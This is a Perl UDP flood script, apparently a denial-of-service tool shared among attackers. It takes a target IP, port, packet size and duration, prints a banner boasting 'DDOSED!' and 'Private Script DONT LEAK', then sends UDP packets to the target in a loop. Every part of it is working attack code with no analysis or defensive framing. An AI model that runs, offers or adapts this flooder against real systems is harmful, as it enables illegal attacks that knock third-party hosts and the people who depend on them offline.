#!/usr/bin/perl

##############
#Gcezp
##############

use Socket;
use strict;

if ($#ARGV != 3) {
  print "crimez.pl <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
╔══════════════════════════════════════════════════════════════════════╗
║ ██╗   ██╗██████╗ ███╗   ██╗██████╗ ███████╗██╗     ██╗   ██╗██╗  ██╗ ║
║ ██║   ██║██╔══██╗████╗  ██║██╔══██╗██╔════╝██║     ██║   ██║╚██╗██╔╝ ║
║ ██║   ██║██████╔╝██╔██╗ ██║██║  ██║█████╗  ██║     ██║   ██║ ╚███╔╝  ║
║ ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║██║  ██║██╔══╝  ██║     ██║   ██║ ██╔██╗  ║
║  ╚████╔╝ ██║     ██║ ╚████║██████╔╝███████╗███████╗╚██████╔╝██╔╝ ██╗ ║
║   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ║
║══════════════════════════════║DDOSED!║═══════════════════════════════║
║                               VPNDELUX                               ║
║                           Gcezp Made This                            ║
║                       Private Script DONT LEAK                       ║
╚══════════════════════════════════════════════════════════════════════╝
HES'S GONE BYE BYE - vpndelux.pl Script

EOTEXT
print "UDP Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood,
pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtr$
0, pack_sockaddr_in($pport, $iaddr));}
